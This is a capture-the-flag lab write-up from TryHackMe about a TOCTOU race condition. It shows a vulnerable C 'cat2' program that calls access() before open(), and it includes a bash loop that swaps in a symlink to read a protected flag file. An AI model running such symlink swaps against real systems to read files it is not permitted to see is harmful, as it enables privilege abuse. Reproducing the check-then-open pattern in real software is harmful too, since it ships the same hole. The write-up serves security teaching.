# Race Condition – Symlink Swap (Filesystem)

**Platform:** TryHackMe

---

# Overview

In this lab we analyze a vulnerable program called **cat2**.

The goal of the program is to behave like the `cat` command but with additional security checks.
The program verifies whether the user has permission to read the file before opening it.

However, the program performs the **security validation before opening the file**, which creates a race condition vulnerability.

---

# Vulnerable Program

Below is the source code used in the lab.

```c
#include <stdio.h>
#include <unistd.h>
#include <assert.h>

int main(int argc, char **argv, char **envp) {

    int fd;
    int n;
    int context; 
    char buf[1024];

    if (argc != 2) {
        puts("Usage: cat2 <FILE>");
        return 1;
    }

    puts("Checking the user's security context...");
    context = check_security_contex(argv[1]);
    puts("Context has been checked, proceeding!\n");

    if (context == 0) {
        puts("The user has access, outputting file...\n");
        fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    } else {
        puts("[SECURITY BREACH] The user does not have access to this file!");
        return 1;
    }
    
    return 0;
}

int check_security_contex(char *file_name) {

    int context_result;

    context_result = access(file_name, R_OK);
    usleep(500);

    return context_result;
}
```

---

# Vulnerable Logic

The vulnerability appears in this pattern:

```c
access(file_name, R_OK);   // CHECK
usleep(500);
open(file_name, 0);        // USE
```

Program flow:

1. The program checks whether the file is readable using `access()`
2. The program sleeps for **500 microseconds**
3. The program opens the file using `open()`

This creates the classic race pattern:

```
CHECK → DELAY → USE
```

---

# Why This Is Vulnerable

The file is validated using `access()` before it is opened.

Because the filesystem can change between operations, the file that was checked may not be the same file that is later opened.

The `usleep(500)` call creates a small **race window** where the file can be replaced.

---

# Exploitation Concept

The attack works by repeatedly swapping the file with a **symbolic link pointing to the flag**.

A loop continuously replaces the file so that eventually the swap occurs during the race window.

Example script:

```bash
while true
do
    touch test
    ln -s -f /home/run/flag test
    rm test
done
```

At some point:

1. `access()` checks the safe file
2. The file is replaced with a symlink
3. `open()` follows the symlink and opens the flag

---

# Vulnerability Classification

* Race Condition
* TOCTOU (Time Of Check To Time Of Use)
* Symlink Swap Attack

---

# Key Takeaways

* Performing security checks before opening a file can introduce race conditions.
* Even very small timing windows can be exploited.
* Repeating the attack many times increases the probability of hitting the race window.
